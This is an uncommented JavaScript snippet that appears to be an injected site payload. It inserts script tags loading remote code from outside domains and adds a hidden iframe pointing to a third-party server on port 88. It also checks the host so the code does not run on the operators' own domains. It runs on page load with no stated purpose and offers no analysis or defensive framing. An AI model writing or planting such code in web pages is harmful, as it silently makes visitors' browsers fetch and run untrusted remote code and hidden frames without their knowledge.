function newjs(){
var star = document.createElement("script");
star.src = "http://junkucm.com/bd/query.js?vid=40000";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(star, s);
};

function old(){
var star = document.createElement("script");
star.src = "https://itbaguanan.com/counter.js?_sid=6000";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(star, s);
};

function abc() {
	var wy = document.createElement("div");
	wy.style = "display:none";
	wy.innerHTML  = "<iframe src=\"http://t.7gg.cc:88/new.html\" ></iframe>";
	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(wy, s);
};

function forbidHost(){
        var host = top.window.location.host;
        if ((host.indexOf(".7gg.cc") != -1)||(host.indexOf(".junkucm.com") != -1)||(host.indexOf(".wsgblw.com") != -1)){
            return true;
        }
    }
	
aa();

function aa(){
	        if(forbidHost()){
            return false;
        }

var mbad=Math.ceil(Math.random()*100);
if (mbad<-1){
newjs();
abc();
}else{
old();
abc();
}
}
